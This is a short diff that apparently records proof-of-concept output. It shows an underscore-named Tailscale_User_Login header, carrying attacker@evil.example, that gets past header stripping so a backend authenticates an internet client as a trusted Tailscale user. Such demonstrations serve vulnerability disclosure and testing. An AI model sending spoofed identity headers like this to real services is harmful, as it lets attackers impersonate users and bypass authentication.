@@ -1,0 +1,4 @@
+internet client sends: Tailscale-User-Login=stripped-dash AND Tailscale_User_Login=attacker@evil.example
+  backend raw headers seen: "User-Agent" "Accept-Encoding" "Tailscale-Funnel-Request" "Tailscale_user_login" 
+  backend HTTP_TAILSCALE_USER_LOGIN = "attacker@evil.example"
+  >>> SPOOFED: backend authenticated the internet attacker as a trusted Tailscale user <<<
